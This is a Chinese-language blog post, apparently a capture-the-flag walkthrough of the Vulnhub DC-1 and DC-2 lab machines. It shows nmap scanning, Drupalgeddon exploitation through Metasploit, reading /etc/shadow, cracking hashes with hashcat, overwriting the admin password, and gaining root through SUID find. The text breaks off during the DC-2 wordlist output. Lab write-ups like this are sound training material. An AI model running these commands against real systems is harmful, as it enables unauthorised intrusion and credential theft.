@@ -1,0 +1,859 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Vulnhub DC | HackThe4O4</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="DC1DC: 1  第一步先找IP，已知該機器的MAC 00:0C:29:9D:6F:F7 netdiscover -i eth1 -r 192.168.147.0&#x2F;24  IP 192.168.147.132 在來查看該機器是否有開啟的服務跟port nmap -sV -p- -O -T4 -A 192.168.147.132  22&#x2F;tcp       open  ssh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub DC">
+<meta property="og:url" content="https://no-flag.com/2024/12/21/vulnhub_DC/index.html">
+<meta property="og:site_name" content="HackThe4O4">
+<meta property="og:description" content="DC1DC: 1  第一步先找IP，已知該機器的MAC 00:0C:29:9D:6F:F7 netdiscover -i eth1 -r 192.168.147.0&#x2F;24  IP 192.168.147.132 在來查看該機器是否有開啟的服務跟port nmap -sV -p- -O -T4 -A 192.168.147.132  22&#x2F;tcp       open  ssh">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_1.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_2.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_3.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_4.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_5.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_6.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_7.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_8.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_9.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_10.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_11.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_12.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_13.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_14.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_15.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_16.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_17.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_18.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_19.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_20.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_21.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_22.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_23.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_24.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_25.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_26.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_27.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_28.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_29.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_30.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_31.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_32.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_33.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_34.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_35.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_36.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_37.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_38.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_39.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_40.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_41.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_42.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_43.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_44.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_45.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_46.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_47.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_48.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_49.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_50.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_51.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_52.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_53.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_54.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_55.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_56.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_57.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_58.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_59.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_60.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_61.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_62.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_63.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_64.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_65.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_66.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_67.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_68.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_69.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_70.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_71.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_72.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_73.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_74.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_75.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_47.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_48.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_49.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_50.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_51.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_52.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_53.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_54.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_55.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_56.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_57.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_58.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_59.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_60.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_61.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_62.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_63.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_64.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_65.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_66.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_67.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_68.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_69.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_70.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_71.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_72.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_73.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_74.png">
+<meta property="og:image" content="https://no-flag.com/img/DC_Untitled_75.png">
+<meta property="article:published_time" content="2024-12-21T12:32:07.097Z">
+<meta property="article:modified_time" content="2024-03-01T23:23:10.388Z">
+<meta property="article:author" content="Noflag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://no-flag.com/img/DC_Untitled.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+	<!-- If needed, replace your own web font service -->
+  <link href="https://fonts.googleapis.com/css?family=Crimson+Text:400,700|Inconsolata|Oswald" rel="stylesheet" />
+
+  
+   
+  
+<link rel="stylesheet" href="/icomoon/style.css">
+
+  
+<link rel="stylesheet" href="/style.css">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="site-wrapper is_post_page">
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<script>document.getElementById("loading-bar").style.width="20%";</script>
+
+
+<header id="header" class="site-header clearfix">
+
+  <a class="logo square clearfix" href="/">
+    <!-- 
+      Replace with your own size name, for example:
+      <span class="b">A</span>
+      <span class="w">B</span>
+      <span class="b">C</span>
+     -->
+     <span class="b">A</span>
+     <span class="b">R</span>
+     <span class="b">T</span>
+     <span class="w">I</span>
+     <span class="w">F</span>
+     <span class="b">A</span>
+     <span class="b">C</span>
+     <span class="b">T</span>
+  </a>
+  <a class="me square site-nav-switch clearfix">
+    <span class="b">
+    	<span class="icon icon-menu"></span>
+    </span>
+  </a>
+
+</header>
+
+    <script>document.getElementById("loading-bar").style.width="40%";</script>
+    <main id="main" class="clearfix">
+      <article id="dc-vulnhub_DC"
+  class="article white-box article-type-dc"
+  itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    <h1 class="article-title" itemprop="name">
+      Vulnhub DC
+    </h1>
+    <div class="article-meta">
+      Posted on 
+      <time class="article-time" datetime="2024-12-21T12:32:07.097Z" itemprop="datePublished">
+        Dec 21, 2024
+      </time>
+    </div>
+  </header>
+
+  <div class="article-entry" itemprop="articleBody">
+    <h1 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">DC: 1</a></p>
+<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-1.zip"></a></p>
+<p>第一步先找IP，已知該機器的MAC 00:0C:29:9D:6F:F7</p>
+<p><code>netdiscover -i eth1 -r 192.168.147.0/24</code></p>
+<p><img src="/img/DC_Untitled.png" alt="Untitled"></p>
+<p>IP 192.168.147.132</p>
+<p>在來查看該機器是否有開啟的服務跟port</p>
+<p><code>nmap -sV -p- -O -T4 -A 192.168.147.132</code></p>
+<p><img src="/img/DC_Untitled_1.png" alt="Untitled"></p>
+<p>22&#x2F;tcp       open  ssh          OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)<br>80&#x2F;tcp       open  http        Apache httpd 2.2.22 ((Debian))<br>111&#x2F;tcp     open  rpcbind   2-4 (RPC #100000)<br>39453&#x2F;tcp open  status      1 (RPC #100024)</p>
+<p>查看了一下22port，google搜索下來沒有可利用的漏洞</p>
+<p>接下來直接開啟80的網站查看內容</p>
+<p><img src="/img/DC_Untitled_2.png" alt="Untitled"></p>
+<ul>
+<li>http-generator: Drupal 7 (<a target="_blank" rel="noopener" href="http://drupal.org/">http://drupal.org</a>) 前面有提到</li>
+</ul>
+<p>去查該版本的漏洞後發現一個CVE-2014-3704可以嘗試利用，這樣就可以確定說SQL injection攻擊是成立的</p>
+<p><img src="/img/DC_Untitled_3.png" alt="Untitled"></p>
+<p>也可以用Nmap確認漏洞</p>
+<p>└─# <code>nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd=&quot;uname -a&quot;,http-vuln-cve2014-3704.uri=&quot;/node&quot; 192.168.147.132</code></p>
+<p><img src="/img/DC_Untitled_4.png" alt="Untitled"></p>
+<p>接下來可以使用<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/drupal_drupageddon.md">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/drupal_drupageddon.md</a></p>
+<p>這msf的模塊去攻擊測試，且攻擊成功</p>
+<p><img src="/img/DC_Untitled_5.png" alt="Untitled"></p>
+<p>flag1 : Every good CMS needs a config file - and so do you.</p>
+<p><img src="/img/DC_Untitled_6.png" alt="Untitled"></p>
+<p>看起來需要個配置文件</p>
+<hr>
+<p>另一種解法</p>
+<p><img src="/img/DC_Untitled_7.png" alt="Untitled"></p>
+<hr>
+<p>在目錄搜索時，切換成shell，方便執行linux命令，到&#x2F;sites&#x2F;default下有個設定檔，看到內容中含flag2訊息</p>
+<p><img src="/img/DC_Untitled_8.png" alt="Untitled"></p>
+<p>為了登錄數據庫，需要使用pty套件切換</p>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)’</code></p>
+<p><code>mysql -u dbuser -p</code> 輸入剛給的密碼登入</p>
+<p><img src="/img/DC_Untitled_9.png" alt="Untitled"></p>
+<p>查看數據庫中存在的databases</p>
+<p><img src="/img/DC_Untitled_10.png" alt="Untitled"></p>
+<p><code>show tables;</code></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_drupaldb          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> actions                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> authmap                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> batch                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> block                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> block_custom                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> block_node_type             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> block_role                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> blocked_ips                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_block                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_bootstrap             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_field                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_filter                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_form                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_image                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_menu                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_page                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_path                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_update                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_views                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_views_data            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> comment                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ctools_css_cache            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ctools_object_cache         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> date_format_locale          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> date_format_type            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> date_formats                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_config                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_config_instance       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_data_body             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_data_comment_body     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_data_field_image      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_data_field_tags       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_revision_body         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_revision_comment_body <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_revision_field_image  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_revision_field_tags   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> file_managed                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> file_usage                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">filter</span>                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> filter_format               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> flood                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> history                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> image_effects               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> image_styles                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> menu_custom                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> menu_links                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> menu_router                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node_access                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node_comment_statistics     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node_revision               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node_type                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> queue                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> rdf_mapping                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> registry                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> registry_file               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> role                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> role_permission             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> search_dataset              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> search_index                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> search_node_links           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> search_total                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> semaphore                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sequences                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sessions                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> shortcut_set                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> shortcut_set_users          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">system</span>                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> taxonomy_index              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> taxonomy_term_data          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> taxonomy_term_hierarchy     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> taxonomy_vocabulary         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> url_alias                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> users                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> users_roles                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> variable                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> views_display               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> views_view                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> watchdog                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>注意到users的tables，查看後找到admin</p>
+<p><code>SELECT*FROM users;</code></p>
+<p><img src="/img/DC_Untitled_11.png" alt="Untitled"></p>
+<ul>
+<li>admin $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</li>
+<li>Fred $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg</li>
+</ul>
+<p>從這<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5031662/what-is-drupals-default-password-encryption-method">https://stackoverflow.com/questions/5031662/what-is-drupals-default-password-encryption-method</a> 網站知道drupals他密碼的加密方式是使用hash</p>
+<p><img src="/img/DC_Untitled_12.png" alt="Untitled"></p>
+<p>也許可以用hashcat嘗試，不過需要先下載rockyou的文件爆破</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</a></p>
+<p>把剛剛admin密碼丟到txt中</p>
+<p><img src="/img/DC_Untitled_13.png" alt="Untitled"></p>
+<p><code>hashcat -m 7900 hash.txt rockyou.txt</code></p>
+<p>admin</p>
+<p><img src="/img/DC_Untitled_14.png" alt="Untitled"></p>
+<p>發現用hashcat似乎爆破不出東西，也許可以嘗試更改admin passwd </p>
+<p>需要到官網看<a target="_blank" rel="noopener" href="https://www.drupal.org/node/1023428">https://www.drupal.org/node/1023428</a>有寫到如何重製管理員密碼</p>
+<p><img src="/img/DC_Untitled_15.png" alt="Untitled"></p>
+<p>一定要在根目錄運行這命令，不然php會報錯</p>
+<p><img src="/img/DC_Untitled_16.png" alt="Untitled"></p>
+<p>更新管理員密碼</p>
+<p><code>UPDATE users SET pass=&#39;$S$DDoWc38rXBcchn0CbMo1r3KqZYoSb3UF5H95f4BO6JkTcpM0ySch&#39; WHERE uid =1</code></p>
+<p><img src="/img/DC_Untitled_17.png" alt="Untitled"></p>
+<p>admin:123456 </p>
+<p><img src="/img/DC_Untitled_18.png" alt="Untitled"></p>
+<p>到Content頁面下會看到flag3</p>
+<p><img src="/img/DC_Untitled_19.png" alt="Untitled"></p>
+<p><img src="/img/DC_Untitled_20.png" alt="Untitled"></p>
+<p>腳本化本地 Linux 枚舉和權限升級檢查，利用這個確認具有特殊權限的 find 命令。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<p><img src="/img/DC_Untitled_21.png" alt="Untitled"></p>
+<p>SETUID 和 SETGID 是 Unix 訪問權限標誌，允許用戶分別以可執行文件所有者或組的權限運行可執行文件，並更改目錄中的行為。它們通常用於允許計算機系統上的用戶以臨時提升的權限運行程序，以執行特定任務。</p>
+<p>在這種情況下，我們不必是 root 即可以 root 身份執行命令。</p>
+<p>提示可以使用 -exec 指令來執行 command，可能原因是 <code>Find</code> 工具被設有 <code>SUID</code> 權限。</p>
+<p><code>find / -type f \( -perm 04000 -o -perm -02000 \) -exec ls -lg &#123;&#125; \;</code></p>
+<p><img src="/img/DC_Untitled_22.png" alt="Untitled"></p>
+<p>find &#x2F;: 這是搜索的起始目錄，表示從根目錄開始遞歸搜索。</p>
+<ul>
+<li><code>type f:</code> 這是選項，指定只搜索文件類型。</li>
+<li><code>\( -perm 04000 -o -perm -02000 \)</code>: 這是一個複合條件，使用<strong>圓括號表示 OR 關係</strong>。 -perm 04000 表示搜索具有設置了 SUID（Set User ID）權限位的文件，而 -perm -02000 表示搜索具有設置了 SGID（Set Group ID）權限位的文件。</li>
+<li><code>exec ls -lg &#123;&#125; \;</code>  : 這是 -exec 選項的用法，用於在找到的<strong>每個文件上執行指定的命令</strong>。在這裡，命令是 ls -lg {}，它會顯示文件的詳細信息，包括權限、所有者和組等。</li>
+<li><code>\;</code> 表示命令的結束。</li>
+</ul>
+<p>為了取得 flag4 的帳號權限，這部分有幾個套路。</p>
+<ol>
+<li>讀取 shadow 檢視 flag4 的 hash 並解密</li>
+<li>透過 find -exec 執行 &#x2F;bin&#x2F;sh 獲取 root 權限，並直接瀏覽 flag</li>
+<li>透過 find -exec 執行 &#x2F;bin&#x2F;sh 獲取 root 權限，再透過 ssh 匯入 authorized_keys 並透過 ssh 進行登入。</li>
+<li>透過 find -exec 執行 &#x2F;bin&#x2F;sh 獲取 root 權限，直接修改 flag4 使用者的密碼後，再透過 SSH 進行登入。</li>
+</ol>
+<ul>
+<li><p>可以直接選擇<code>find -exec /bin/sh \;</code>直接取得root權限</p>
+</li>
+<li><p><code>find / -name passwd -exec cat &#123;&#125; \;</code></p>
+</li>
+</ul>
+<p><img src="/img/DC_Untitled_23.png" alt="Untitled"></p>
+<ul>
+<li>find &#x2F; -name shadow -exec cat {} ;</li>
+</ul>
+<p><img src="/img/DC_Untitled_24.png" alt="Untitled"></p>
+<p><code>flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</code></p>
+<p>這是SHA-512 crypt 用hashcat爆破試試 </p>
+<p><code>hashcat -a 0 -m 1800 flag4.txt /usr/share/wordlists/rockyou.txt</code></p>
+<p><img src="/img/DC_Untitled_25.png" alt="Untitled"></p>
+<ul>
+<li>$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY&#x2F;eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:<code>orange</code></li>
+</ul>
+<p>知道flag4密碼後就去ssh登入</p>
+<p><img src="/img/DC_Untitled_26.png" alt="Untitled"></p>
+<p><img src="/img/DC_Untitled_27.png" alt="Untitled"></p>
+<p>需要到root去訪問</p>
+<p>用find嘗試提權<code>find . -exec &#39;/bin/sh&#39; \;</code></p>
+<p><img src="/img/DC_Untitled_28.png" alt="Untitled"></p>
+<hr>
+<h1 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-2,311/">DC: 2</a></p>
+<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-2.zip"></a></p>
+<p>一樣先找機器的IP</p>
+<p><code>netdiscover -i eth1 -r 192.168.147.0/24</code></p>
+<p><img src="/img/DC_Untitled_29.png" alt="Untitled"></p>
+<p>IP : <code>192.168.147.133</code></p>
+<p><code>nmap -sV -p- -O -T4 192.168.147.133</code></p>
+<p><img src="/img/DC_Untitled_30.png" alt="Untitled"></p>
+<p>因為預設到80 port會直接變dc-2解析，所以要更改&#x2F;etc&#x2F;hosts網頁才正常顯示</p>
+<p><img src="/img/DC_Untitled_31.png" alt="Untitled"></p>
+<p>查看到使用的服務 </p>
+<p><img src="/img/DC_Untitled_32.png" alt="Untitled"></p>
+<p><img src="/img/DC_Untitled_33.png" alt="Untitled"></p>
+<p>往下看有個flag</p>
+<p><img src="/img/DC_Untitled_34.png" alt="Untitled"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Flag <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need <span class="keyword">to</span> be cewl.</span><br><span class="line"></span><br><span class="line">More passwords <span class="keyword">is</span> always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log <span class="keyword">in</span> <span class="keyword">as</span> <span class="keyword">one</span> <span class="keyword">to</span> see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log <span class="keyword">in</span> <span class="keyword">as</span> another.</span><br></pre></td></tr></table></figure>
+
+<p>也許是跟wordpress有關，提示說到cewl可以查一下這啥</p>
+<p>CeWL</p>
+<p>是一個密碼字典生成器，用爬蟲方式將網站出現的單字列出來並可輸出成檔案供其他工具如</p>
+<p>john來當密碼檔使用，簡單的用法如下</p>
+<ul>
+<li>-d 指定深度，預設為2</li>
+<li>-m 可以限制單字的最小長度，所以這邊長度至少要到8才會被列出</li>
+<li>-w 是將單字輸出至指定檔案</li>
+<li>-e 是指定爬蟲過程也處理email，搭配</li>
+<li>–email_file 將結果輸出到檔案</li>
+</ul>
+<p>最後指定一個目標網站來進行蒐集</p>
+<p><code>cewl [dc-2](http://dc-2/index.php) -w dict.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sit</span><br><span class="line">amet</span><br><span class="line">nec</span><br><span class="line">quis</span><br><span class="line">vel</span><br><span class="line">orci</span><br><span class="line">site</span><br><span class="line">non</span><br><span class="line">sed</span><br><span class="line">vitae</span><br><span class="line">luctus</span><br><span class="line">sem</span><br><span class="line">Sed</span><br><span class="line">leo</span><br><span class="line">ante</span><br><span class="line">content</span><br><span class="line">nisi</span><br><span class="line">Donec</span><br><span class="line">turpis</span><br><span class="line">Aenean</span><br><span class="line">wrap</span><br><span class="line">tincidunt</span><br><span class="line">finibus</span><br><span class="line">dictum</span><br><span class="line">egestas</span><br><span class="line">volutpat</span><br><span class="line">justo</span><br><span class="line">odio</span><br><span class="line">eget</span><br><span class="line">Vestibulum</span><br><span class="line">ipsum</span><br><span class="line">neque</span><br><span class="line">erat</span><br><span class="line">vestibulum</span><br><span class="line">interdum</span><br><span class="line">quam</span><br><span class="line">sodales</span><br><span class="line">nulla</span><br><span class="line">suscipit</span><br><span class="line">arcu</span><br><span class="line">urna</span><br><span class="line">dui</span><br><span class="line">faucibus</span><br><span class="line">sapien</span><br><span class="line">blandit</span><br><span 